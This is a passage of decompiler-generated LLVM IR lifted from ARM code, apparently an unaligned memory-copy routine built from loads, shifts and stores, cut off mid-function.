  store i1 %v7_111e8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_111f0

dec_label_pc_111f0:                               ; preds = %dec_label_pc_111f0.loopexit, %dec_label_pc_111cc
  %v0_111f0 = load i32, i32* @r1, align 4
  %v1_111f0 = add i32 %v0_111f0, -2
  store i32 %v1_111f0, i32* @r1, align 4
  %v0_111f4 = call i32 @function_110ac()
  store i32 %v0_111f4, i32* @r0, align 4
  %v0_111f8 = load i32, i32* @r2, align 4
  %v2_111f8 = add i32 %v0_111f8, -12
  %v4_111f8 = sub i32 11, %v0_111f8
  %v5_111f8 = and i32 %v4_111f8, %v0_111f8
  %v6_111f8 = icmp slt i32 %v5_111f8, 0
  store i1 %v6_111f8, i1* %cpsr_v.global-to-local, align 1
  %v7_111f8 = icmp slt i32 %v2_111f8, 0
  store i1 %v7_111f8, i1* %cpsr_n.global-to-local, align 1
  %v8_111f8 = icmp eq i32 %v0_111f8, 12
  store i1 %v8_111f8, i1* %cpsr_z.global-to-local, align 1
  %v5_111fc = icmp slt i32 %v0_111f8, 12
  br i1 %v5_111fc, label %dec_label_pc_11244, label %dec_label_pc_11200

dec_label_pc_11200:                               ; preds = %dec_label_pc_111f0
  store i32 %v2_111f8, i32* %r2.global-to-local, align 4
  %v3_11204 = load i32, i32* @r4, align 4
  store i32 %v3_11204, i32* %stack_var_-8, align 4
  %v6_11204 = load i32, i32* @r5, align 4
  br label %dec_label_pc_11208

dec_label_pc_11208:                               ; preds = %dec_label_pc_11208, %dec_label_pc_11200
  %v0_1122c = phi i32 [ %v12_1122c, %dec_label_pc_11208 ], [ %v0_111f4, %dec_label_pc_11200 ]
  %v0_11208 = load i32, i32* @lr, align 4
  %v3_11208 = udiv i32 %v0_11208, 16777216
  store i32 %v3_11208, i32* %r3.global-to-local, align 4
  %v0_1120c = load i32, i32* @r1, align 4
  %v1_1120c = inttoptr i32 %v0_1120c to i32*
  %v2_1120c = load i32, i32* %v1_1120c, align 4
  store i32 %v2_1120c, i32* %r4.global-to-local, align 4
  %v3_1120c = add i32 %v0_1120c, 4
  %v4_1120c = inttoptr i32 %v3_1120c to i32*
  %v5_1120c = load i32, i32* %v4_1120c, align 4
  store i32 %v5_1120c, i32* %r5.global-to-local, align 4
  %v6_1120c = add i32 %v0_1120c, 8
  %v7_1120c = inttoptr i32 %v6_1120c to i32*
  %v8_1120c = load i32, i32* %v7_1120c, align 4
  store i32 %v8_1120c, i32* %ip.global-to-local, align 4
  %v9_1120c = add i32 %v0_1120c, 12
  %v10_1120c = inttoptr i32 %v9_1120c to i32*
  %v11_1120c = load i32, i32* %v10_1120c, align 4
  store i32 %v11_1120c, i32* @lr, align 4
  %v12_1120c = add i32 %v0_1120c, 16
  store i32 %v12_1120c, i32* @r1, align 4
  %v4_11210 = mul i32 %v2_1120c, 256
  %v5_11210 = or i32 %v4_11210, %v3_11208
  store i32 %v5_11210, i32* @r3, align 4
  %v3_11214 = udiv i32 %v2_1120c, 16777216
  %v4_11218 = mul i32 %v5_1120c, 256
  %v5_11218 = or i32 %v4_11218, %v3_11214
  store i32 %v5_11218, i32* %r4.global-to-local, align 4
  %v3_1121c = udiv i32 %v5_1120c, 16777216
  %v4_11220 = mul i32 %v8_1120c, 256
  %v5_11220 = or i32 %v4_11220, %v3_1121c
  store i32 %v5_11220, i32* %r5.global-to-local, align 4
  %v3_11224 = udiv i32 %v8_1120c, 16777216
  %v4_11228 = mul i32 %v11_1120c, 256
  %v5_11228 = or i32 %v4_11228, %v3_11224
  store i32 %v5_11228, i32* @ip, align 4
  %v1_1122c = inttoptr i32 %v0_1122c to i32*
  store i32 %v5_11210, i32* %v1_1122c, align 4
  %v3_1122c = add i32 %v0_1122c, 4
  %v4_1122c = inttoptr i32 %v3_1122c to i32*
  %v5_1122c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1122c, i32* %v4_1122c, align 4
  %v6_1122c = add i32 %v0_1122c, 8
  %v7_1122c = inttoptr i32 %v6_1122c to i32*
  %v8_1122c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1122c, i32* %v7_1122c, align 4
  %v9_1122c = add i32 %v0_1122c, 12
  %v10_1122c = inttoptr i32 %v9_1122c to i32*
  %v11_1122c = load i32, i32* @ip, align 4
  store i32 %v11_1122c, i32* %v10_1122c, align 4
  %v12_1122c = add i32 %v0_1122c, 16
  store i32 %v12_1122c, i32* @r0, align 4
  %v0_11230 = load i32, i32* %r2.global-to-local, align 4
  %v2_11230 = add i32 %v0_11230, -16
  store i32 %v2_11230, i32* %r2.global-to-local, align 4
  %v6_11234 = icmp slt i32 %v0_11230, 16
  br i1 %v6_11234, label %dec_label_pc_11238, label %dec_label_pc_11208

dec_label_pc_11238:                               ; preds = %dec_label_pc_11208
  %v2_11238 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11238, i32* @r4, align 4
  store i32 %v6_11204, i32* @r5, align 4
  %v2_1123c = add i32 %v0_11230, -4
  store i32 %v2_1123c, i32* @r2, align 4
  %v4_1123c = add i32 %v0_11230, 2147483632
  %v5_1123c = and i32 %v2_1123c, %v4_1123c
  %v6_1123c = icmp slt i32 %v5_1123c, 0
  store i1 %v6_1123c, i1* %cpsr_v.global-to-local, align 1
  %v7_1123c = icmp slt i32 %v2_1123c, 0
  store i1 %v7_1123c, i1* %cpsr_n.global-to-local, align 1
  %v8_1123c = icmp eq i32 %v2_1123c, 0
  store i1 %v8_1123c, i1* %cpsr_z.global-to-local, align 1
  %v5_11240 = icmp slt i32 %v2_11230, -12
  br i1 %v5_11240, label %dec_label_pc_1125c, label %dec_label_pc_11244

dec_label_pc_11244:                               ; preds = %dec_label_pc_11238, %dec_label_pc_111f0, %dec_label_pc_11244
  %v1_11250 = phi i32 [ %v4_11250, %dec_label_pc_11244 ], [ %v12_1122c, %dec_label_pc_11238 ], [ %v0_111f4, %dec_label_pc_111f0 ]
  %v0_11244 = load i32, i32* @lr, align 4
  %v3_11244 = udiv i32 %v0_11244, 16777216
  store i32 %v3_11244, i32* %ip.global-to-local, align 4
  %v0_11248 = load i32, i32* @r1, align 4
  %v1_11248 = inttoptr i32 %v0_11248 to i32*
  %v2_11248 = load i32, i32* %v1_11248, align 4
  store i32 %v2_11248, i32* @lr, align 4
  %v4_11248 = add i32 %v0_11248, 4
  store i32 %v4_11248, i32* @r1, align 4
  %v4_1124c = mul i32 %v2_11248, 256
  %v5_1124c = or i32 %v4_1124c, %v3_11244
  store i32 %v5_1124c, i32* @ip, align 4
  %v2_11250 = inttoptr i32 %v1_11250 to i32*
  store i32 %v5_1124c, i32* %v2_11250, align 4
  %v3_11250 = load i32, i32* @r0, align 4
  %v4_11250 = add i32 %v3_11250, 4
  store i32 %v4_11250, i32* @r0, align 4
  %v0_11254 = load i32, i32* @r2, align 4
  %v2_11254 = add i32 %v0_11254, -4
  store i32 %v2_11254, i32* @r2, align 4
  %v6_11258 = icmp slt i32 %v0_11254, 4
  br i1 %v6_11258, label %dec_label_pc_1125c.loopexit, label %dec_label_pc_11244

dec_label_pc_1125c.loopexit:                      ; preds = %dec_label_pc_11244
  %v4_11254 = sub i32 3, %v0_11254
  %v5_11254 = and i32 %v4_11254, %v0_11254
  %v6_11254 = icmp slt i32 %v5_11254, 0
  %v7_11254 = icmp slt i32 %v2_11254, 0
  store i1 %v6_11254, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_11254, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1125c

dec_label_pc_1125c:                               ; preds = %dec_label_pc_1125c.loopexit, %dec_label_pc_11238
  %v0_1125c = load i32, i32* @r1, align 4
  %v1_1125c = add i32 %v0_1125c, -1
  store i32 %v1_1125c, i32* @r1, align 4
  %v0_11260 = call i32 @function_110ac()
  %v0_11264 = load i32, i32* @r1, align 4
  %v1_11264 = load i32, i32* @r2, align 4
  %v2_11264 = add i32 %v1_11264, %v0_11264
  store i32 %v2_11264, i32* %r1.global-to-local, align 4
  %v2_11268 = add i32 %v1_11264, %v0_11260
  store i32 %v2_11268, i32* %r0.global-to-local, align 4
  %v2_1126c = add i32 %v1_11264, -4
  store i32 %v2_1126c, i32* %r2.global-to-local, align 4
  %v4_1126c = sub i32 3, %v1_11264
  %v5_1126c = and i32 %v4_1126c, %v1_11264
  %v6_1126c = icmp slt i32 %v5_1126c, 0
  store i1 %v6_1126c, i1* %cpsr_v.global-to-local, align 1
  %v7_1126c = icmp slt i32 %v2_1126c, 0
  store i1 %v7_1126c, i1* %cpsr_n.global-to-local, align 1
  %v8_1126c = icmp eq i32 %v1_11264, 4
  store i1 %v8_1126c, i1* %cpsr_z.global-to-local, align 1
  %v5_11270 = icmp slt i32 %v1_11264, 4
  br i1 %v5_11270, label %bb68, label %dec_label_pc_11274

dec_label_pc_11274:                               ; preds = %dec_label_pc_1125c
  %v1_11274 = urem i32 %v2_11268, 4
  store i32 %v1_11274, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11274 = icmp eq i32 %v1_11274, 0
  store i1 %v2_11274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11274, label %dec_label_pc_1127c, label %dec_label_pc_1131c

dec_label_pc_1127c:                               ; preds = %dec_label_pc_11274
  %v1_1127c = urem i32 %v2_11264, 4
  store i32 %v1_1127c, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1127c = icmp eq i32 %v1_1127c, 0
  store i1 %v2_1127c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1127c, label %dec_label_pc_11284, label %dec_label_pc_11348

dec_label_pc_11284:                               ; preds = %dec_label_pc_1127c, %dec_label_pc_11340
  %v0_1129c41 = phi i32 [ %v2_11268, %dec_label_pc_1127c ], [ %v0_1139024, %dec_label_pc_11340 ]
  %v0_1129840 = phi i32 [ %v2_11264, %dec_label_pc_1127c ], [ %v0_11340, %dec_label_pc_11340 ]
  %v0_11284 = phi i32 [ %v2_1126c, %dec_label_pc_1127c ], [ %v2_11338, %dec_label_pc_11340 ]
  %v2_11284 = add i32 %v0_11284, -8
  store i32 %v2_11284, i32* %r2.global-to-local, align 4
  %v4_11284 = sub i32 7, %v0_11284
  %v5_11284 = and i32 %v4_11284, %v0_11284
  %v6_11284 = icmp slt i32 %v5_11284, 0
  store i1 %v6_11284, i1* %cpsr_v.global-to-local, align 1
  %v7_11284 = icmp slt i32 %v2_11284, 0
  store i1 %v7_11284, i1* %cpsr_n.global-to-local, align 1
  %v8_11284 = icmp eq i32 %v0_11284, 8
  store i1 %v8_11284, i1* %cpsr_z.global-to-local, align 1
  %v5_11288 = icmp slt i32 %v0_11284, 8
  br i1 %v5_11288, label %dec_label_pc_112d4, label %dec_label_pc_1128c

dec_label_pc_1128c:                               ; preds = %dec_label_pc_11284
  %v3_1128c = load i32, i32* @r4, align 4
  store i32 %v3_1128c, i32* %stack_var_-8, align 4
  %v6_1128c = load i32, i32* @lr, align 4
  %v2_11290 = add i32 %v0_11284, -28
  store i32 %v2_11290, i32* %r2.global-to-local, align 4
  %v4_11290 = sub i32 27, %v0_11284
  %v5_11290 = and i32 %v4_11290, %v2_11284
  %v6_11290 = icmp slt i32 %v5_11290, 0
  store i1 %v6_11290, i1* %cpsr_v.global-to-local, align 1
  %v7_11290 = icmp slt i32 %v2_11290, 0
  store i1 %v7_11290, i1* %cpsr_n.global-to-local, align 1
  %v8_11290 = icmp eq i32 %v2_11284, 20
  store i1 %v8_11290, i1* %cpsr_z.global-to-local, align 1
  %v5_11294 = icmp slt i32 %v2_11284, 20
  br i1 %v5_11294, label %dec_label_pc_112b0, label %dec_label_pc_11298

dec_label_pc_11298:                               ; preds = %dec_label_pc_1128c, %dec_label_pc_11298.dec_label_pc_11298_crit_edge
  %v0_1129c = phi i32 [ %v1_112a4, %dec_label_pc_11298.dec_label_pc_11298_crit_edge ], [ %v0_1129c41, %dec_label_pc_1128c ]
  %v0_11298 = phi i32 [ %v0_11298.pre, %dec_label_pc_11298.dec_label_pc_11298_crit_edge ], [ %v0_1129840, %dec_label_pc_1128c ]
  %v1_11298 = add i32 %v0_11298, -4
  %v2_11298 = inttoptr i32 %v1_11298 to i32*
  %v3_11298 = load i32, i32* %v2_11298, align 4
  store i32 %v3_11298, i32* %r3.global-to-local, align 4
  %v4_11298 = add i32 %v0_11298, -8
  %v5_11298 = inttoptr i32 %v4_11298 to i32*
  %v6_11298 = load i32, i32* %v5_11298, align 4
  store i32 %v6_11298, i32* %r4.global-to-local, align 4
  %v7_11298 = add i32 %v0_11298, -12
  %v8_11298 = inttoptr i32 %v7_11298 to i32*
  %v9_11298 = load i32, i32* %v8_11298, align 4
  store i32 %v9_11298, i32* %ip.global-to-local, align 4
  %v10_11298 = add i32 %v0_11298, -16
  %v11_11298 = inttoptr i32 %v10_11298 to i32*
  %v12_11298 = load i32, i32* %v11_11298, align 4
  store i32 %v12_11298, i32* %lr.global-to-local, align 4
  store i32 %v10_11298, i32* %r1.global-to-local, align 4
  %v1_1129c = add i32 %v0_1129c, -16
  %v2_1129c = inttoptr i32 %v1_1129c to i32*
  store i32 %v3_11298, i32* %v2_1129c, align 4
  %v4_1129c = add i32 %v0_1129c, -12
  %v5_1129c = inttoptr i32 %v4_1129c to i32*
  %v6_1129c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1129c, i32* %v5_1129c, align 4
  %v7_1129c = add i32 %v0_1129c, -8
  %v8_1129c = inttoptr i32 %v7_1129c to i32*
  %v9_1129c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1129c, i32* %v8_1129c, align 4
  %v10_1129c = add i32 %v0_1129c, -4
  %v11_1129c = inttoptr i32 %v10_1129c to i32*
  %v12_1129c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1129c, i32* %v11_1129c, align 4
  store i32 %v1_1129c, i32* %r0.global-to-local, align 4
  %v0_112a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_112a0 = add i32 %v0_112a0, -4
  %v2_112a0 = inttoptr i32 %v1_112a0 to i32*
  %v3_112a0 = load i32, i32* %v2_112a0, align 4
  store i32 %v3_112a0, i32* %r3.global-to-local, align 4
  %v4_112a0 = add i32 %v0_112a0, -8
  %v5_112a0 = inttoptr i32 %v4_112a0 to i32*
  %v6_112a0 = load i32, i32* %v5_112a0, align 4
  store i32 %v6_112a0, i32* %r4.global-to-local, align 4
  %v7_112a0 = add i32 %v0_112a0, -12
  %v8_112a0 = inttoptr i32 %v7_112a0 to i32*
  %v9_112a0 = load i32, i32* %v8_112a0, align 4
  store i32 %v9_112a0, i32* %ip.global-to-local, align 4
  %v10_112a0 = add i32 %v0_112a0, -16
  %v11_112a0 = inttoptr i32 %v10_112a0 to i32*
  %v12_112a0 = load i32, i32* %v11_112a0, align 4
  store i32 %v12_112a0, i32* %lr.global-to-local, align 4
  store i32 %v10_112a0, i32* %r1.global-to-local, align 4
  %v1_112a4 = add i32 %v0_1129c, -32
  %v2_112a4 = inttoptr i32 %v1_112a4 to i32*
  store i32 %v3_112a0, i32* %v2_112a4, align 4
  %v4_112a4 = add i32 %v0_1129c, -28
  %v5_112a4 = inttoptr i32 %v4_112a4 to i32*
  %v6_112a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_112a4, i32* %v5_112a4, align 4
  %v7_112a4 = add i32 %v0_1129c, -24
  %v8_112a4 = inttoptr i32 %v7_112a4 to i32*
  %v9_112a4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_112a4, i32* %v8_112a4, align 4
  %v10_112a4 = add i32 %v0_1129c, -20
  %v11_112a4 = inttoptr i32 %v10_112a4 to i32*
  %v12_112a4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_112a4, i32* %v11_112a4, align 4
  store i32 %v1_112a4, i32* %r0.global-to-local, align 4
  %v0_112a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_112a8 = add i32 %v0_112a8, -32
  store i32 %v2_112a8, i32* %r2.global-to-local, align 4
  %v6_112ac = icmp slt i32 %v0_112a8, 32
  br i1 %v6_112ac, label %dec_label_pc_112b0.loopexit, label %dec_label_pc_11298.dec_label_pc_11298_crit_edge

dec_label_pc_11298.dec_label_pc_11298_crit_edge:  ; preds = %dec_label_pc_11298
  %v0_11298.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11298

dec_label_pc_112b0.loopexit:                      ; preds = %dec_label_pc_11298
  %v4_112a8 = sub i32 31, %v0_112a8
  %v5_112a8 = and i32 %v4_112a8, %v0_112a8
  %v6_112a8 = icmp slt i32 %v5_112a8, 0
  %v7_112a8 = icmp slt i32 %v2_112a8, 0
  store i1 %v6_112a8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_112a8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_112b0

dec_label_pc_112b0:                               ; preds = %dec_label_pc_112b0.loopexit, %dec_label_pc_1128c
  %v6_112b8 = phi i32 [ %v1_112a4, %dec_label_pc_112b0.loopexit ], [ %v0_1129c41, %dec_label_pc_1128c ]
  %v0_112c0.pr = phi i32 [ %v2_112a8, %dec_label_pc_112b0.loopexit ], [ %v2_11290, %dec_label_pc_1128c ]
  %v4_112b0 = add i32 %v0_112c0.pr, 16
  %v6_112b0 = sub i32 0, %v0_112c0.pr
  %v7_112b0 = and i32 %v4_112b0, %v6_112b0
  %v8_112b0 = icmp slt i32 %v7_112b0, 0
  store i1 %v8_112b0, i1* %cpsr_v.global-to-local, align 1
  %v9_112b0 = icmp slt i32 %v4_112b0, 0
  store i1 %v9_112b0, i1* %cpsr_n.global-to-local, align 1
  %v10_112b0 = icmp eq i32 %v4_112b0, 0
  store i1 %v10_112b0, i1* %cpsr_z.global-to-local, align 1
  %v5_112b4 = icmp slt i32 %v0_112c0.pr, -16
  br i1 %v5_112b4, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_112b0
  %v6_112b4 = load i32, i32* %r1.global-to-local, align 4
  %v7_112b4 = add i32 %v6_112b4, -4
  %v8_112b4 = inttoptr i32 %v7_112b4 to i32*
  %v9_112b4 = load i32, i32* %v8_112b4, align 4
  store i32 %v9_112b4, i32* %r3.global-to-local, align 4
  %v10_112b4 = add i32 %v6_112b4, -8
  %v11_112b4 = inttoptr i32 %v10_112b4 to i32*
  %v12_112b4 = load i32, i32* %v11_112b4, align 4
  store i32 %v12_112b4, i32* %r4.global-to-local, align 4
  %v13_112b4 = add i32 %v6_112b4, -12
  %v14_112b4 = inttoptr i32 %v13_112b4 to i32*
  %v15_112b4 = load i32, i32* %v14_112b4, align 4
  store i32 %v15_112b4, i32* %ip.global-to-local, align 4
  %v16_112b4 = add i32 %v6_112b4, -16
  %v17_112b4 = inttoptr i32 %v16_112b4 to i32*
  %v18_112b4 = load i32, i32* %v17_112b4, align 4
  store i32 %v18_112b4, i32* %lr.global-to-local, align 4
  store i32 %v16_112b4, i32* %r1.global-to-local, align 4
  %v7_112b8 = add i32 %v6_112b8, -16
  %v8_112b8 = inttoptr i32 %v7_112b8 to i32*
  store i32 %v9_112b4, i32* %v8_112b8, align 4
  %v10_112b8 = add i32 %v6_112b8, -12
  %v11_112b8 = inttoptr i32 %v10_112b8 to i32*
  %v12_112b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_112b8, i32* %v11_112b8, align 4
  %v13_112b8 = add i32 %v6_112b8, -8
  %v14_112b8 = inttoptr i32 %v13_112b8 to i32*
  %v15_112b8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v15_112b8, i32* %v14_112b8, align 4
  %v16_112b8 = add i32 %v6_112b8, -4
  %v17_112b8 = inttoptr i32 %v16_112b8 to i32*
  %v18_112b8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_112b8, i32* %v17_112b8, align 4
  store i32 %v7_112b8, i32* %r0.global-to-local, align 4
  %v6_112bc = load i32, i32* %r2.global-to-local, align 4
  %v7_112bc = add i32 %v6_112bc, -16
  store i32 %v7_112bc, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_112b0, %bb
  %v6_112c8 = phi i32 [ %v7_112b8, %bb ], [ %v6_112b8, %dec_label_pc_112b0 ]
  %v0_112c0 = phi i32 [ %v7_112bc, %bb ], [ %v0_112c0.pr, %dec_label_pc_112b0 ]
  %v4_112c0 = add i32 %v0_112c0, 20
  store i32 %v4_112c0, i32* %r2.global-to-local, align 4
  %v6_112c0 = sub i32 0, %v0_112c0
  %v7_112c0 = and i32 %v4_112c0, %v6_112c0
  %v8_112c0 = icmp slt i32 %v7_112c0, 0
  store i1 %v8_112c0, i1* %cpsr_v.global-to-local, align 1
  %v9_112c0 = icmp slt i32 %v4_112c0, 0
  store i1 %v9_112c0, i1* %cpsr_n.global-to-local, align 1
  %v10_112c0 = icmp eq i32 %v4_112c0, 0
  store i1 %v10_112c0, i1* %cpsr_z.global-to-local, align 1
  %v5_112c4 = icmp slt i32 %v0_112c0, -20
  br i1 %v5_112c4, label %.thread3, label %bb66

bb66:                                             ; preds = %.thread1
  %v6_112c4 = load i32, i32* %r1.global-to-local, align 4
  %v7_112c4 = add i32 %v6_112c4, -4
  %v8_112c4 = inttoptr i32 %v7_112c4 to i32*
  %v9_112c4 = load i32, i32* %v8_112c4, align 4
  store i32 %v9_112c4, i32* %r3.global-to-local, align 4
  %v10_112c4 = add i32 %v6_112c4, -8
  %v11_112c4 = inttoptr i32 %v10_112c4 to i32*
  %v12_112c4 = load i32, i32* %v11_112c4, align 4
  store i32 %v12_112c4, i32* %ip.global-to-local, align 4
  %v13_112c4 = add i32 %v6_112c4, -12
  %v14_112c4 = inttoptr i32 %v13_112c4 to i32*
  %v15_112c4 = load i32, i32* %v14_112c4, align 4
  store i32 %v15_112c4, i32* %lr.global-to-local, align 4
  store i32 %v13_112c4, i32* %r1.global-to-local, align 4
  %v7_112c8 = add i32 %v6_112c8, -12
  %v8_112c8 = inttoptr i32 %v7_112c8 to i32*
  store i32 %v9_112c4, i32* %v8_112c8, align 4
  %v10_112c8 = add i32 %v6_112c8, -8
  %v11_112c8 = inttoptr i32 %v10_112c8 to i32*
  %v12_112c8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v12_112c8, i32* %v11_112c8, align 4
  %v13_112c8 = add i32 %v6_112c8, -4
  %v14_112c8 = inttoptr i32 %v13_112c8 to i32*
  %v15_112c8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_112c8, i32* %v14_112c8, align 4
  store i32 %v7_112c8, i32* %r0.global-to-local, align 4
  %v6_112cc = load i32, i32* %r2.global-to-local, align 4
  %v7_112cc = add i32 %v6_112cc, -12
  store i32 %v7_112cc, i32* %r2.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %bb66
  %v6_112ec49 = phi i32 [ %v6_112c8, %.thread1 ], [ %v7_112c8, %bb66 ]
  %v0_112d447 = phi i32 [ %v4_112c0, %.thread1 ], [ %v7_112cc, %bb66 ]
  %v2_112d0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_112d0, i32* %r4.global-to-local, align 4
  store i32 %v6_1128c, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_112d4

dec_label_pc_112d4:                               ; preds = %dec_label_pc_11284, %.thread3
  %v7_112e4 = phi i32 [ %v0_1129c41, %dec_label_pc_11284 ], [ %v6_112ec49, %.thread3 ]
  %v0_112d4 = phi i32 [ %v2_11284, %dec_label_pc_11284 ], [ %v0_112d447, %.thread3 ]
  %v2_112d4 = add i32 %v0_112d4, 8
  store i32 %v2_112d4, i32* %r2.global-to-local, align 4
  %v4_112d4 = sub i32 0, %v0_112d4
  %v5_112d4 = and i32 %v2_112d4, %v4_112d4
  %v6_112d4 = icmp slt i32 %v5_112d4, 0
  store i1 %v6_112d4, i1* %cpsr_v.global-to-local, align 1
  %v7_112d4 = icmp slt i32 %v2_112d4, 0
  store i1 %v7_112d4, i1* %cpsr_n.global-to-local, align 1
  %v8_112d4 = icmp eq i32 %v2_112d4, 0
  store i1 %v8_112d4, i1* %cpsr_z.global-to-local, align 1
  %v5_112d8 = icmp slt i32 %v0_112d4, -8
  br i1 %v5_112d8, label %bb68, label %dec_label_pc_112dc

dec_label_pc_112dc:                               ; preds = %dec_label_pc_112d4
  %v6_112dc = add i32 %v0_112d4, 4
  store i32 %v6_112dc, i32* %r2.global-to-local, align 4
  %v8_112dc = sub i32 -5, %v0_112d4
  %v9_112dc = and i32 %v8_112dc, %v2_112d4
  %v10_112dc = icmp slt i32 %v9_112dc, 0
  store i1 %v10_112dc, i1* %cpsr_v.global-to-local, align 1
  %v11_112dc = icmp slt i32 %v6_112dc, 0
  store i1 %v11_112dc, i1* %cpsr_n.global-to-local, align 1
  %v12_112dc = icmp eq i32 %v2_112d4, 4
  store i1 %v12_112dc, i1* %cpsr_z.global-to-local, align 1
  %v5_112e0 = icmp slt i32 %v2_112d4, 4
  %v6_112e0 = load i32, i32* %r1.global-to-local, align 4
  %v7_112e0 = add i32 %v6_112e0, -4
  %v8_112e0 = inttoptr i32 %v7_112e0 to i32*
  %v9_112e0 = load i32, i32* %v8_112e0, align 4
  store i32 %v9_112e0, i32* %r3.global-to-local, align 4
  br i1 %v5_112e0, label %.thread7, label %bb67

.thread7:                                         ; preds = %dec_label_pc_112dc
  store i32 %v7_112e0, i32* %r1.global-to-local, align 4
  %v8_112e4 = add i32 %v7_112e4, -4
  %v9_112e4 = inttoptr i32 %v8_112e4 to i32*
  store i32 %v9_112e0, i32* %v9_112e4, align 4
  %v10_112e4 = load i32, i32* %r0.global-to-local, align 4
  %v11_112e4 = add i32 %v10_112e4, -4
  store i32 %v11_112e4, i32* %r0.global-to-local, align 4
  %v0_112f4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb68

bb67:                                             ; preds = %dec_label_pc_112dc
  %v10_112e8 = add i32 %v6_112e0, -8
  %v11_112e8 = inttoptr i32 %v10_112e8 to i32*
  %v12_112e8 = load i32, i32* %v11_112e8, align 4
  store i32 %v12_112e8, i32* %ip.global-to-local, align 4
  store i32 %v10_112e8, i32* %r1.global-to-local, align 4
  %v7_112ec = add i32 %v7_112e4, -8
  %v8_112ec = inttoptr i32 %v7_112ec to i32*
  store i32 %v9_112e0, i32* %v8_112ec, align 4
  %v10_112ec = add i32 %v7_112e4, -4
  %v11_112ec = inttoptr i32 %v10_112ec to i32*
  %v12_112ec = load i32, i32* %ip.global-to-local, align 4
  store i32 %v12_112ec, i32* %v11_112ec, align 4
  store i32 %v7_112ec, i32* %r0.global-to-local, align 4
  %v6_112f0 = load i32, i32* %r2.global-to-local, align 4
  %v7_112f0 = add i32 %v6_112f0, -4
  store i32 %v7_112f0, i32* %r2.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %.thread7, %.thread13, %dec_label_pc_112d4, %dec_label_pc_1125c, %dec_label_pc_11498, %dec_label_pc_1142c, %dec_label_pc_113c0, %bb67
  %v2_112f8 = phi i32 [ %v11_112e4, %.thread7 ], [ %v0_1139024, %.thread13 ], [ %v7_112e4, %dec_label_pc_112d4 ], [ %v2_11268, %dec_label_pc_1125c ], [ %v2_1130457, %dec_label_pc_11498 ], [ %v2_1130456, %dec_label_pc_1142c ], [ %v2_1130455, %dec_label_pc_113c0 ], [ %v7_112ec, %bb67 ]
  %v0_112f4 = phi i32 [ %v0_112f4.pre, %.thread7 ], [ %v2_11338, %.thread13 ], [ %v2_112d4, %dec_label_pc_112d4 ], [ %v2_1126c, %dec_label_pc_1125c ], [ %v0_112f453, %dec_label_pc_11498 ], [ %v0_112f452, %dec_label_pc_1142c ], [ %v0_112f451, %dec_label_pc_113c0 ], [ %v7_112f0, %bb67 ]
  %v1_112f4 = add i32 %v0_112f4, 4
  store i32 %v1_112f4, i32* %r2.global-to-local, align 4
  %v3_112f4 = sub i32 0, %v0_112f4
  %v4_112f4 = and i32 %v1_112f4, %v3_112f4
  %v5_112f4 = icmp slt i32 %v4_112f4, 0
  store i1 %v5_112f4, i1* %cpsr_v.global-to-local, align 1
  %v6_112f4 = icmp slt i32 %v1_112f4, 0
  store i1 %v6_112f4, i1* %cpsr_n.global-to-local, align 1
  %v7_112f4 = icmp eq i32 %v1_112f4, 0
  store i1 %v7_112f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112f4, label %.thread62, label %bb69

.thread62:                                        ; preds = %bb71, %.thread, %bb68
  %merge = phi i32 [ %v2_112f8, %bb68 ], [ %v11_11314, %bb71 ], [ %v7_11314, %.thread ]
  ret i32 %merge

bb69:                                             ; preds = %bb68
  %v1_112fc = add i32 %v0_112f4, 2
  %v3_112fc = sub i32 -3, %v0_112f4
  %v4_112fc = and i32 %v3_112fc, %v1_112f4
  %v5_112fc = icmp slt i32 %v4_112fc, 0
  store i1 %v5_112fc, i1* %cpsr_v.global-to-local, align 1
  %v6_112fc = icmp slt i32 %v1_112fc, 0
  store i1 %v6_112fc, i1* %cpsr_n.global-to-local, align 1
  %v7_112fc = icmp eq i32 %v1_112f4, 2
  store i1 %v7_112fc, i1* %cpsr_z.global-to-local, align 1
  %v0_11300 = load i32, i32* %r1.global-to-local, align 4
  %v1_11300 = add i32 %v0_11300, -1
  %v2_11300 = inttoptr i32 %v1_11300 to i8*
  %v3_11300 = load i8, i8* %v2_11300, align 1
  %v4_11300 = zext i8 %v3_11300 to i32
  store i32 %v4_11300, i32* %r3.global-to-local, align 4
  store i32 %v1_11300, i32* %r1.global-to-local, align 4
  %v3_11304 = add i32 %v2_112f8, -1
